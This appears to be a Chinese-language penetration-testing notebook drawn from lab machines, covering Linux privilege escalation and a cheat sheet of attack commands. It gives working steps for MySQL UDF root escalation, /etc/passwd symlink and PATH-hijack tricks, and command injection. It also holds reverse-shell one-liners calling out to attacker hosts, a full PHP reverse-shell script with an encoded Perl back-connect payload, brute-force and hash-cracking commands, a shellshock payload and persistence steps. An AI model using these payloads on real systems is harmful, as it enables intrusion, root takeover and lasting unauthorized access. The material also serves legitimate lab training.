```

条件：

- mysql 以 **root 身份**运行
- **有导入导出功能**，`SHOW VARIABLES LIKE "secure_file_priv";`

​                  secure_file_priv的value为null ，不允许导入导出，则无法使用udf提权。

​                  secure_file_priv的value为/dir/ ，只允许dir目录下导入导出。

​                  secure_file_priv的value为空，无限制。

- **有上传目录**，且目录可写

  ```
  根据mysql数据库的版本确定上传的脚本目录：
  1.mysql<5.1，导出目录c:/windows或system32
  2.mysql=>5.1，导出mysql/lib/plugin/的绝对路径（如C:/phpstudy/mysql/lib/plugin/）如果没有需要创建
  ```

1、登录mysql

<img src=".\图片\Snipaste_2023-05-30_13-109-41.png" alt="Snipaste_2023-05-30_13-09-41" style="zoom:80%;" />

2、查看plugin目录

```sql
show global variables like 'plugin%';
```

```sql
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
```

**目录没有问题**可以进行上传UDF

3、查看导入的目录

```sql
mysql> show global variables like 'secure%';
show global variables like 'secure%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
```

secure_file_priv 是空目录可以进行任何地方的导入 

4、searchsploit搜索漏洞

```bash
└─# searchsploit mysql udf
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                                      | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                                     | linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                                                           | windows/remote/3274.txt
MySQL 4/5/6 - UDF for Command Execution                                                                                     | linux/local/7856.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                              
┌──(root💀kali)-[~]
└─# locate linux/local/1518.c                    
/usr/share/exploitdb/exploits/linux/local/1518.c
                                                                                                                                                              
┌──(root💀kali)-[~]
└─# cp /usr/share/exploitdb/exploits/linux/local/1518.c 1518.c  
```

5、编译成so文件

```bash
gcc -g -c 1518.c
gcc -g -shared -o lyqdjx.so 1518.o -lc
```

6、靶机下载kali里的lyqdjx.so文件

```bash
www-data@Raven:/var/www/html/wordpress$ cd /tmp
cd /tmp
www-data@Raven:/tmp$ wget http://192.168.0.103:7777/lyqdjx.so
```

7、靶机进入mysql数据库

```sql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

8、创建一个表

```sql
mysql> ccreate table zf1yolo(line blob);
create table zf1yolo(line blob);
Query OK, 0 rows affected (0.00 sec)
```

9、

添加字段数值，添加的我们上传到靶机的 payload

```sql
mysql> insert into zf1yolo values(load_file('/tmp/lyqdjx.so'));
insert into zf1yolo values(load_file('/tmp/lyqdjx.so'));
Query OK, 1 row affected (0.00 sec)
```

将 zf1yolo 表中的所有内如导入到 `/usr/lib/mysql/plugin`

```sql
mysql> select * from zf1yolo into dumpfile '/usr/lib/mysql/plugin/lyqdjx.so';
select * from zf1yolo into dumpfile '/usr/lib/mysql/plugin/lyqdjx.so';
Query OK, 1 row affected (0.00 sec)
```

创建自定义函数

```sql
mysql> create function do_system returns integer soname 'lyqdjx.so';
create function do_system returns integer soname 'lyqdjx.so';
Query OK, 0 rows affected (0.00 sec)
```

通过审计 1518.c 我们知道使用的是 do_system 函数可以以root权限执行命令，到了这里就可以随心所欲了。

举个例子，通过 do_system 使 find 命令所有者的 suid 权限，使其可以以 root 权限执行命令(创建具有suid权限，方便提权)

```sql
mysql> select do_system('chmod u+s /usr/bin/find');
select do_system('chmod u+s /usr/bin/find');
+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.01 sec)
```

10、suid 的 find 提权

[(150条消息) 小记 SUID find提权_Crispr-bupt的博客-CSDN博客](https://blog.csdn.net/crisprx/article/details/104110725)

```bash
touch getshell
find / -type f -name getshell -exec "whoami" \;
find / -type f -name getshell -exec "/bin/sh" \;
```



## 软连接

举个例子：

当前我们是 apache 权限，发现一个以root身份执行了 `/usr/share/scripts/chown.sh`，当前只能读

```bash
bash-4.4$ ls -al
-rw-r--r--.  1 root root   45 May 29  2021 chown.sh
bash-4.4$ cat chown.sh
cat chown.sh
chown rocky:apache /home/rocky/public_html/*
```

这里的意思是把 `/home/rocky/public_html/`  底下所有的文件权限切换到 `rocky:apache`

假如我们可以把 /etc/passwd 软连接到 /home/rocky/public_html/ 目录下，/etc/passwd 就是用户 rocky 用户组 apache 权限了，我们便可以修改root密码或者把密码置空

```bash
bash-4.4$ ln -s /etc/passwd /home/rocky/public_html/passwd
ln -s /etc/passwd /home/rocky/public_html/passwd
```

软连接后的/etc/passwd权限

```bash
-rwxrwxr-x.  1 rocky apache   1548 Dec  2 05:47 passwd
```

最后修改 /etc/passwd 即可，可以通过追加 `echo xxx >> /etc/passwd`，也可以 cp 覆盖 `cp passwd /etc/passwd`

详情见：

```http
E:\渗透笔记\靶机\大福\Cereal.md
```



## 环境变量劫持

例子：

看到有个backup文件夹，过去看看

<img src=".\图片\700440-20200904145949019-714744502.png" alt="img"  />

 

看见文件procwatch且是二进制文件，而且每个用户都有执行权限，执行一下看看

<img src=".\图片\700440-20200904150114604-211097632223.png" alt="img" style="zoom:80%;" />

 

发现像是使用shell脚本的形式执行了ps命令，这里如果懂二进制的话，大可以直接去调试二进制文件看看，可以参考：https://www.nuharborsecurity.com/nullbyte-1-walkthrough/

知道上面的结果那么我们可以劫持ps命令提权了

可以使用下面方法提权，软连接

```
cd /var/www/backup
ln -s /bin/sh ps
export PATH=.:$PATH
./procwatch
```

也可以生成一个 ps 文件，然后里面写/bin/sh就可以，给这个文件所有权限然后执行二进制即可提权



## 命令劫持

例子：

msg2root 可以以 root 身份执行 echo 命令，且参数为可控

于是，分开执行 `ss;bash -p;` （bash -p为高权限执行bash）

```bash
bash-4.3$ ./msg2root
./msg2root
Message for root: ss;bash -p;
ss;bash -p;
ss
bash-4.3# id
id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
flag.txt  messages.txt
```



## 其它

- 当我们可以修改一个root计划任务文件、suid 权限的执行文件时，可以如下操作，把 /bin/bash 复制出来加上 s 位

  ```bash
  eric@driftingblues# cat /tmp/emergency 
  #!/bin/bash
  cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot
  
  eric@driftingblues:/tmp$ ./getroot -p
  getroot-4.3# whoami
  root
  ```

  当然也可以添加反弹shell



# 实用技巧及工具

- `fcrackzip` 破解 `zip` 文件

  ```bash
  fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip
  ```

- 破解数据包流量文件 `.cap` ，`aircrack-ng` 工具

  ```bash
  aircrack-ng -w rockyou.txt user.cap
  ```

- 反弹 shel l命令，这里目标机不是用的 `bash` 而是 `dash`，bash反弹无效，用 nc 反弹：

  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.250.128 8881 >/tmp/f
  ```

- `linux` 用 `openssl` 生成账号密码

  ```bash
  openssl passwd -1 -salt zf1yolo 123456
  $1$zf1yolo$oULk89mtehUjxLPH9cRSn1
  zf1yolo:$1$zf1yolo$oULk89mtehUjxLPH9cRSn1:0:0:root:/root:/bin/bash
  ```

- linux 的 find 命令，查找 flag

  ```bash
  find / -name "flag*"
  find / -name "test.py" 2>/dev/null
  find / -name "*pass*" -type  f 2>/dev/null  查找靶机中关于密码的信息
  find / -name "*config*" -type  f 2>/dev/null | grep /var/www    查找网站中关于配置文件的信息
  find / -perm 777 -type f 2>/dev/null   查找具有777 权限的文件
  find / -type f -name "cleaner.py" 2>/dev/null   查找  cleaner.py
  find / -user root -writable -type f -not -path "/proc/*"  2>/dev/null
  ```

  [Linux find 命令 | 菜鸟教程 (runoob.com)](https://www.runoob.com/linux/linux-comm-find.html)

- 生成SSH公钥和私钥，上传公钥（且重命名为authorized_keys）到目标服务器用户家目录的 `.ssh` 目录下，注意私钥的权限是 400，私钥登录：

  ```bash
  ssh-keygen -f rails
  mv rails.pub authorized_keys
  chmod 400 rails
  ssh -i rails rails@172.16.250.131
  ```


- `unzip` 解压 .zip 文件

  ```bassh
  unzip user.zip
  ```

- 常见反弹 shell

  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.103 443 >/tmp/f
  
  bash -c "bash -i >& /dev/tcp/192.168.0.103/6666 0>&1"
  
  在kali里输入：
  └─# echo "bash -i &> /dev/tcp/192.168.2.7/1234 0>&1"|base64
  YmFzaCAtaSAmPiAvZGV2L3RjcC8xOTIuMTY4LjIuNy8xMjM0IDA+JjEK
  在 命令执行的地方 输入：
  echo "YmFzaCAtaSAmPiAvZGV2L3RjcC8xOTIuMTY4LjIuNy8xMjM0IDA+JjEK"|base64 -d|bash
  
  php -r '$sock=fsockopen("10.10.10.144",1234);exec("/bin/bash <&3 >&3 2>&3");'
  
  反弹shell时最好 /bin/bash -c 加参数尝试
  /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.103/1234 0>&1'
  ```
  
  一个 php 反弹 shell 脚本
  
  ```php
  <?php
  function which($pr) {
  	$path = execute("which $pr");
  	return ($path ? $path : $pr);
  	}
  function execute($cfe) {
  	$res = '';
  	if ($cfe) {
  		if(function_exists('exec')) {
  			@exec($cfe,$res);
  			$res = join("\n",$res);
  			} 
  			elseif(function_exists('shell_exec')) {
  			$res = @shell_exec($cfe);
  			} elseif(function_exists('system')) {
  @ob_start();
  @system($cfe);
  $res = @ob_get_contents();
  @ob_end_clean();
  } elseif(function_exists('passthru')) {
  @ob_start();
  @passthru($cfe);
  $res = @ob_get_contents();
  @ob_end_clean();
  } elseif(@is_resource($f = @popen($cfe,"r"))) {
  $res = '';
  while(!@feof($f)) {
  $res .= @fread($f,1024);
  }
  @pclose($f);
  }
  }
  return $res;
  }
  function cf($fname,$text){
  if($fp=@fopen($fname,'w')) {
  @fputs($fp,@base64_decode($text));
  @fclose($fp);
  }
  }
  $yourip = "your IP";
  $yourport = 'your port';
  $usedb = array('perl'=>'perl','c'=>'c');
  $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
  "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
  "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
  "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
  "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
  "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
  "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
  cf('/tmp/.bc',$back_connect);
  $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
  ?> 
  ```
  


- base64解码

  ```bash
  echo 'L25vdGVmb3JraW5nZmlzaC50eHQ=' | base64 -d 
  ```

- strings 命令查看二进制文件中的字符串

  ```bash
  strings XXX
  ```

- sudo 指定用户运行脚本

  ```bash
  sudo -u jens ./backups.sh
  ```

- 切割整理字符串，`grep` 二次过滤、`awk` 切割、`tr` 替换、`sort -u`排序后删除重复行

  ```bash
  cat username_test.list | awk '{print $6}' > password.list
  nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ','
  cat /etc/passwd | grep 'sh\|home' | sort -u
  cat passwd | grep -v -E "nologin|false" | cut -d ":" -f 1 > ssh_user_name
  ```

- `hydra` 爆破

  ```bash
  hydra -L username.list -P password.list ssh://192.168.0.114
  
  hydra -l RickSanchez -P "rick.txt" ssh://192.168.101.70:22222  端口可以指定，服务器可能换了 ssh 的端口，比如这里就换成了 22222
  ```

- knock 敲开端口，用 nc 敲门也行。敲门配置一般设置可能在 `/etc/knockd.conf`，假如可读取便可知道敲门的规则

  ```
  knock 192.168.0.114 7469 8475  9842
  ```

  也可以运行脚本，knockhttp.sh：

  ```bash
  #!/bin/bash
  
  for PORT in 159 27391 4;do nmap -Pn 192.168.2.6  -p  $PORT;
  done
  ```

  补充：使用 python，根据上述的3个数字列出全部的排列组合

  ```python
  from itertools import combinations, permutations
  print(list(permutations([8890,7000,666])))
  ```

  使用脚本将排列组合为 `port.sh` ，knock测试：

  ```bash
  #!/bin/bash
  while read -r line
  do
  echo '---------------'
  knock -v 192.168.0.102 $line
  done < knock.txt
  ```

  ```bash
  ./port.sh
  ```


- `file` 命令查看文件的基本信息

  ```bash
  file test
  
  test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped
  ```

- 交互 shell

  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  ```

- 查看目录下文件

  ```
  ls -al
  ls -la
  ls -alR  递归查看
  ls -laRh
  ```

- 连接 msyql

  ```bash
  mysql -uroot -pmysql
  ```

- 靶机上传文件

  nc

  ```
  kali执行：nc -l -p 9999 > derp.pcap 
  目标靶机执行：nc 192.168.10.9 9999 < derpissues.pcap
  ```

  python 和 wget

  ```
  python -m http.server 1234
  wget http://xxxx.com/xxx.pcap
  ```

- 分析流量文件

  ```
  wireshark  XXX.pacp
  过滤 POST http.request.method=="POST"
  ```

  或者

  ```
  tcpdump -qns 0 -X -r derp.pcap > bmfxderp.txt
  tcpdump -nt -r derp.pcap -A 2>/dev/null | grep -P 'pwd='
  ```

- 目录枚举后，得到了很多存在的 url ，此时可以把这里的目录整理（用 grep、 awk 与管道符整理）到一个 url.list 字典文件中，用 curl 命令 批量访问，替升效率

  ```bash
  for i in `cat url.list`;do curl $i;done
  ```

- lshell 受限制 shell 的绕过

  ```bash
  intern:~$ echo $SHELL
  /usr/local/bin/lshell
  ```

  全网找方法 [Lshell - aldeid](https://www.aldeid.com/wiki/Lshell)

  ```bash
  echo os.system('/bin/bash')
  echo && 'bash'
  ```

- 例子1：linux权限维持的想法，把 bin/bash 复制出来并加上 s 位权限

  ```bash
  cp /bin/bash /tmp/getroot
  chmod +s /tmp/getroot
  /tmp/getroot -p
  ```

  例子2：改变 /etc/shadow 的拥有者权限，`chown` 命令

  ```bash
  chown -R john:john /etc/shadow
  ```

  例子3：把 john 用户分配到 admin 组里去

  ```bash
  usermod -a -G admin john
  ```

  这里参考以下我服务器里的 sudoers 文件

  ```bash
  root@VM-4-8-ubuntu:/home/ubuntu# cat /etc/sudoers
  #
  # This file MUST be edited with the 'visudo' command as root.
  #
  # Please consider adding local content in /etc/sudoers.d/ instead of
  # directly modifying this file.
  #
  # See the man page for details on how to write a sudoers file.
  #
  Defaults        env_reset
  Defaults        mail_badpass
  Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  
  # Host alias specification
  
  # User alias specification
  
  # Cmnd alias specification
  
  # User privilege specification
  root    ALL=(ALL:ALL) ALL
  
  # Members of the admin group may gain root privileges
  %admin ALL=(ALL) ALL
  
  # Allow members of group sudo to execute any command
  %sudo   ALL=(ALL:ALL) ALL
  
  # See sudoers(5) for more information on "#include" directives:
  
  #includedir /etc/sudoers.d
  lighthouse ALL=(ALL) NOPASSWD: ALL
  ubuntu  ALL=(ALL:ALL) NOPASSWD: ALL
  ```

- man 命令可查看脚本的帮助信息

  ```bash
  man /usr/bin/genie
  ```

   [man命令 - Linux命令大全 | linux教程 (linux265.com)](https://linux265.com/course/linux-command-man.html)


- `.pyc`  文件可 反编译成 `.py` 文件，使用网站 [python反编译 - 在线工具 (tool.lu)](https://tool.lu/pyc/)

-  python2 的 `input` 函数有缺陷，例子如下：

  ```python
  def guessit():
      num = randint(1, 101)
      print 'Choose a number between 1 to 100: '
      s = input('Enter your number: ')
      if s==num :
          system('/bin/sh')
      else:
          print 'Better Luck next time'
  ```

  `if s == num` ，当输入的参数 为变量名 num 时，便进入了这个 if

  ```bash
  sam@djinn:/home/sam$ sudo /root/lago
  What do you want to do ?
  1 - Be naughty
  2 - Guess the number
  3 - Read some damn files
  4 - Work
  Enter your choice:2
  Choose a number between 1 to 100: 
  Enter your number: num
  # id
  uid=0(root) gid=0(root) groups=0(root)
  ```

- 如果，发现图片是以 base64 形式展示的  `<img src="data:img/png;base64,` ，浏览器查看隐藏图片，火狐浏览器输入以上 base64code 即可， `data:img/png;base64,base64code`


-  `rlwrap` 可以使用 nc 反弹shell 后 上翻下翻键

  ```bash
  rlwrap nc -lvnp 6666
  ```

- `grep -v` 为去掉 xxx  

  ```bash
   cat /etc/passwd | grep -v nologin
  ```

- SSH 连接出现问题时，试试

  ```bash
  ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  loneferret@192.168.0.102
  ```

- john 破解哈希

  ```bash
  sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
  ```

- unix 的 apache 配置文件在

  ```
  /usr/local/etc/apache22/httpd.conf
  ```

- ftp 目录 在 `home/user` 下又可以上传文件时，可以尝试上传公钥 到`.ssh/authorized_keys` ，并私钥登录

- hashcat 破解 hash

  ```bash
  hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.t
  ```

- **ssh私钥的密码存在破解的可能**，`ssh2john` 可以转化 ssh 私钥为 john 可以破解的格式。https://github.com/magnumripper/JohnTheRipper

  ```bash
  python ssh2john.py  id_rsa > id_rsa.txt
  john -w=/usr/share/wordlists/rockyou.txt id_rsa.txt
  ```

- `exiftool` 可以查看文件相关的信息

  ```bash
  exiftool redis-stable.tar.gz 
  ```

- `cat` 命令还是不好使时，用 `more` 命令查看 文件

- cp 文件到别的目录执行

  进入`/home/RickSanchez/RICKS_SAFE` 目录可以发现 `safe` 文件，是可执行的，但是当前用户 `Summer` 没有执行权限。由于Summer 不是 safe 文件的属主，所以也无法修改 safe 文件权限。将 safe 拷贝到 Summer 的家目录下，命名为 safe2，虽然其文件权限没变，属主却变成了 Summer，此时 Summer 便有 safe2 文件的执行权限了

  <img src=".\vulnhub\图片\a8d9723d6cf1ae8ab80723ae8c4a44de.png" alt="a8d9723d6cf1ae8ab80723ae8c4a44de" style="zoom:80%;" />

  <img src=".\vulnhub\图片\75629323b5ee4f6a9b1f6e26aa148ae5.png" alt="75629323b5ee4f6a9b1f6e26aa148ae5" style="zoom:80%;" />

- `crunch` 工具**生成密码字典**，…[crunch学习链接](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/)

  除了flag，上述打印还提示了 RickSanchez 用户的密码，依次是：

  1个大写字母，一个数字，RickSanchez 的老乐队名字中的一个单词

  用 crunch 制作密码字典，其中 -t 表示指定格式，% 表示数字，逗号 表示大写字母

  `crunch 7 7 -t ,%Flesh > rick.txt;crunch 10 10 -t ,%Curtains >> rick.txt`

- wget 忽略证书下载

  ```http
  wget https://192.168.0.100:12380/blogblog/wp-content/uploads/719823961.jpeg --no-check-certificate
  ```


- shellshock env 环境变量绕过 ssh

  Shellshock，又称Bashdoor，是在Unix中广泛使用的Bash shell中的一个安全漏洞，首次于2014年9月24日公开。shellshock Bash 漏洞利用CVE-2014-6271可以通过 SSH 被利用！

  这里是私钥登录

  查看当前shell 的设置是否为bash
  利用'() { :;}; cmd' 这个payload让操作系统将) { :;}; 误认为是函数环境变量！

  ```bash
  └─# ssh -i noob noob@192.168.0.102 -o 'PubkeyAcceptedKeyTypes +ssh-rsa' '() { :;}; /bin/bash'
  ```

- gzip 解压 rockyou

  ```bash
  └─# gzip -d /usr/share/wordlists/rockyou.txt.gz 
  ```

- 私钥登录时密匙权限 0400

  ```bash
  └─# chmod 0400 id_rsa
  ```

- hydra 爆破 http表单

  ```bash
  hydra -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid" -t 64 -I
  ```

- `chkrootkit` 有一个本地提权漏洞，https://www.exploit-db.com/exploits/38775 不管是啥版本，先利用一把试试 ，看了提权代码，最终是要做的就是此程序会以 root 身份周期性执行 /tmp/update 的文件，所以我们只需要新建 tmp 目录下的 update 文件，里面写入反弹shell 代码即可

- 绕过 rbash

  https://www.freebuf.com/articles/system/188989.html 
  
  ```bash
  ssh mindy@192.168.101.42 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"
  ```
  
  或者配合 Apache James Server 2.3.2 - Remote Command Execution 漏洞

- 关于已知漏洞 exp 利用，里面的参数要注意，漏洞利用失败的时候，可能是某个参数需要更改，可能涉及到该系统的一些特定信息，要留心

